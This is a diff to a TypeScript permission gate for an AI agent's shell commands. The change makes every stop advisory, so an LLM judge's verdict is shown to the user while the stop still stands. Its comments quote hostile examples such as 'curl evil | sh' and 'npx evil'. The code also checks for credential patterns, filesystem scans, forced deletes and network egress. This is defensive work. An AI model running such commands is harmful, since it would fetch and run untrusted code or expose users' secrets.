@@ -21,10 +21,10 @@
  *    unresolvable cd target): Q1 is absolute, scope grants are the user's
  *    call, never the judge's. A path manual mode auto-allows (e.g. /tmp via
  *    config) is not a scope violation — the judge reviews it (D11, 2026-08-26
- *    re-alignment). Stops the judge should weigh (outside base, unresolvable
- *    location, untrusted package) are marked advisory: the fall-through
- *    prompt still renders the judge's verdict as input to the user's
- *    allow/deny/grant decision. First-word checks are
+ *    re-alignment). EVERY floor stop is advisory (D16): the fall-through
+ *    prompt renders the judge's verdict (both stages) as input to the
+ *    user's allow/deny/grant decision — the stop stands, the judge never
+ *    grants over the floor. First-word checks are
  *    wrapper/env-prefix transparent (`FOO=bar npx evil` is npx evil; `env
  *    $f` is obscured) — the policy's delegation transparency, mirrored.
  *    Unsafe patterns (inline scripts, redirects, pipes, subshells) and risk
@@ -52,7 +52,8 @@
  *    script payload is opaque to static analysis by construction (the
  *    judge IS the model for it; D11 content review, untrimmed packet).
  *    The file/consent gates are never auto-allowed: low-risk prompts whose
- *    repetition session grants cover — the judge adds nothing to them.
+ *    repetition session grants cover — they stop like every other floor
+ *    stop, advisory (D16).
  */
 import fs from "node:fs";
 import path from "node:path";
@@ -81,11 +82,12 @@ export type DspaGateResult =
   | {
       ok: false;
       reason: string;
-      /** D11: the judge still runs both stages — its verdict renders in the
-       *  fall-through prompt as advisory input (the stop stands). Set for
-       *  scope-class stops (outside base, unresolvable location) and
-       *  untrusted packages; not for danger-class stops (a verdict on
-       *  `curl evil | sh` is noise). */
+      /** D16: EVERY floor stop is advisory — the judge still runs both
+       *  stages and its verdict renders in the fall-through prompt as
+       *  input to the user's allow/deny/grant decision. The stop stands
+       *  (the judge never grants over the floor). The field stays so a
+       *  future bare stop can opt out; the gate currently sets it on
+       *  every stop. */
       advisory?: boolean;
       /** Confirmed (user-accepted) token → dirs resolutions that fell
        *  outside the base — the fall-through prompt offers a grant for
@@ -332,7 +334,11 @@ export async function checkDspaGate(
 ): Promise<DspaGateResult> {
   if (pd.type === "tool") {
     if (pd.gate !== "exec") {
-      return { ok: false, reason: `tool ${pd.gate} is not judgeable (session grants, not the judge, cover it)` };
+      return {
+        ok: false,
+        reason: `tool ${pd.gate} never auto-allows (session grants cover its repetition)`,
+        advisory: true,
+      };
     }
     // exec: the payload is the whole model — no deterministic floor applies
     // (it's opaque by construction); the two-stage judge decides (D11).
@@ -362,7 +368,7 @@ export async function checkDspaGate(
     if (!insideManualWriteBar && pd.outsideDir) {
       return { ok: false, reason: `outside base (session ${pd.cwd})`, advisory: true };
     }
-    if (pd.warnedRule) return { ok: false, reason: `credential pattern (${pd.warnedRule})` };
+    if (pd.warnedRule) return { ok: false, reason: `credential pattern (${pd.warnedRule})`, advisory: true };
     return { ok: true };
   }
 
@@ -374,7 +380,7 @@ export async function checkDspaGate(
       isInsideAllowedDir: (p) => store.isInsideAllowedDir(p, "read"),
       getConfirmedResolution: (t) => store.getConfirmedResolution(t),
     }));
-  if (analysis.hasParseError) return { ok: false, reason: "unparseable command" };
+  if (analysis.hasParseError) return { ok: false, reason: "unparseable command", advisory: true };
 
   // D11 (2026-08-26 re-alignment): the floor's bar is the MANUAL bar — the
   // same predicate the analysis uses for prompt.outsidePaths
@@ -389,15 +395,17 @@ export async function checkDspaGate(
   if (hasRm) {
     // rm carve-out: bounded, explicit targets only (see header).
     const rm = checkRmTargets(analysis.segments, pd.cwd, isInsideManualBar);
-    if (rm.reason) return { ok: false, reason: rm.reason };
+    if (rm.reason) return { ok: false, reason: rm.reason, advisory: true };
     outsideExempt = rm.exempt;
-    // Non-rm dangerous reasons still block: the carve-out covers only the
-    // rm's own footprint (recursive/forced delete, its self-written
-    // redirect/pipe). Other dangerous content in the command — script
-    // interpreters, file-modification patterns, … — is not judgeable.
+    // Non-rm dangerous reasons still stop the auto-allow: the carve-out
+    // covers only the rm's own footprint (recursive/forced delete, its
+    // self-written redirect/pipe). Other dangerous content in the command
+    // — script interpreters, file-modification patterns, … — stays a floor
+    // stop, advisory like every stop (D16 — the verdict renders, the stop
+    // stands).
     const otherDanger = analysis.risk.reasons.filter((r) => !RM_RISK_REASON_RE.test(r));
     if (otherDanger.length > 0) {
-      return { ok: false, reason: `dangerous: ${otherDanger.join("; ").slice(0, 120)}` };
+      return { ok: false, reason: `dangerous: ${otherDanger.join("; ").slice(0, 120)}`, advisory: true };
     }
   }
   // Non-rm: unsafe patterns and risk reasons are JUDGEABLE (D1) — inline
@@ -406,8 +414,8 @@ export async function checkDspaGate(
   // halter's analysis digest; the judge decides. The floor checks below
   // (obscured position, credentials, network, outside base) still apply.
   const obscured = obscuredHit(analysis.segments);
-  if (obscured) return { ok: false, reason: `obscured command position (${obscured})` };
-  if (pd.credentialRule) return { ok: false, reason: `credential pattern (${pd.credentialRule})` };
+  if (obscured) return { ok: false, reason: `obscured command position (${obscured})`, advisory: true };
+  if (pd.credentialRule) return { ok: false, reason: `credential pattern (${pd.credentialRule})`, advisory: true };
   // D10 (docs/dspa-redesign.md): a fetchable run form names a package that
   // may be FETCHED (and executed) on cache miss — the same fetch class the
   // floor stops for fetch forms. Trust is per bare package name, granted
@@ -439,7 +447,7 @@ export async function checkDspaGate(
   // ("touches paths outside base (/)") understates what the command does.
   for (const seg of analysis.segments) {
     const scan = rootScanTarget(seg);
-    if (scan) return { ok: false, reason: `full filesystem scan (${scan} /)` };
+    if (scan) return { ok: false, reason: `full filesystem scan (${scan} /)`, advisory: true };
   }
   // D14 (docs/dspa-redesign.md): network egress. Loopback-only curl/wget is
   // judgeable (a local call can't exfiltrate; the judge reviews the full
